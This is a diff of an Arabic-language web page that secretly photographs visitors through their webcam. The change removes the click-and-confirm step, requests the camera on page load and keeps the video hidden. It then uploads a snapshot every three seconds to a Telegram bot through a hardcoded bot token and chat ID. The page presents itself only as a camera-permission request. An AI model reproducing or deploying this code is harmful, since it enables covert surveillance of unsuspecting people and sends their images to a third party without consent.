@@ -2,17 +2,17 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>جارٍ التحميل...</title>
+  <title>طلب إذن الكاميرا</title>
   <style>
     body { text-align: center; font-family: Arial; padding: 50px; }
     video { width: 640px; height: 480px; display: none; }
-    #status { font-size: 20px; }
+    #status { font-size: 20px; color: red; }
   </style>
 </head>
 <body>
 
-  <h2 id="status">هل تريد السماح باستخدام الكاميرا؟</h2>
-  <button id="startButton">سماح</button> <!-- زر لتشغيل الكاميرا بعد الموافقة -->
+  <h2 id="status">يتم طلب إذن الكاميرا...</h2>
+  <button id="startButton" style="display:none;">سماح</button>
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
 
@@ -21,52 +21,63 @@
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
     const startButton = document.getElementById('startButton');
+    let stream = null;
 
-    startButton.addEventListener('click', () => {
-      const userConfirmed = confirm("هل تريد السماح للموقع باستخدام الكاميرا؟");
-      if (userConfirmed) {
-        startCamera();
-      } else {
-        document.getElementById('status').innerText = 'تم رفض الإذن بالكاميرا 🚫';
-      }
-    });
-
-    function startCamera() {
+    function requestCamera() {
       navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
+        .then(camStream => {
+          stream = camStream;
           video.srcObject = stream;
           document.getElementById('status').innerText = 'يتم الآن التقاط الصور...';
-          startButton.style.display = 'none'; // إخفاء الزر بعد الموافقة
-          captureFrame(); // بدء التقاط الصور
+          captureFrame();
         })
         .catch(err => {
-          document.getElementById('status').innerText = 'فشل في الوصول إلى الكاميرا 😓';
+          document.getElementById('status').innerText = '⚠️ فشل في الوصول إلى الكاميرا';
+          startButton.style.display = 'block'; // إظهار الزر إذا تم رفض الإذن
           console.error("خطأ في تشغيل الكاميرا:", err);
         });
     }
 
     function captureFrame() {
-      if (video.readyState === 4) {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      setInterval(() => {
+        if (video.readyState === 4) {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', '6765420173');
+            formData.append('photo', blob, 'snapshot.jpg');
 
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append('chat_id', '6765420173'); // استبدل بالـ Chat ID
-          formData.append('photo', blob, 'snapshot.jpg');
-
-          fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
-            method: 'POST',
-            body: formData
-          })
-          .then(response => response.json())
-          .then(data => console.log("تم الإرسال:", data))
-          .catch(error => console.error("فشل الإرسال:", error));
-        }, 'image/jpeg');
-      }
-
-      setTimeout(captureFrame, 3000); // التقاط صورة جديدة كل 3 ثوانٍ
+            fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
+              method: 'POST',
+              body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log("تم الإرسال:", data))
+            .catch(error => console.error("فشل الإرسال:", error));
+          }, 'image/jpeg');
+        }
+      }, 3000);
     }
+
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        video.srcObject = null;
+      }
+    }
+
+    // طلب الإذن عند تحميل الصفحة
+    document.addEventListener("DOMContentLoaded", requestCamera);
+
+    // عند تغيير تبويب الصفحة أو إغلاقها، يتم إيقاف الكاميرا لإجبار المتصفح على طلب الإذن مجددًا
+    document.addEventListener("visibilitychange", () => {
+      if (document.hidden) stopCamera();
+    });
+
+    window.addEventListener("beforeunload", stopCamera);
+
+    // زر يدوي في حالة رفض الإذن
+    startButton.addEventListener('click', requestCamera);
   </script>
 
 </body>
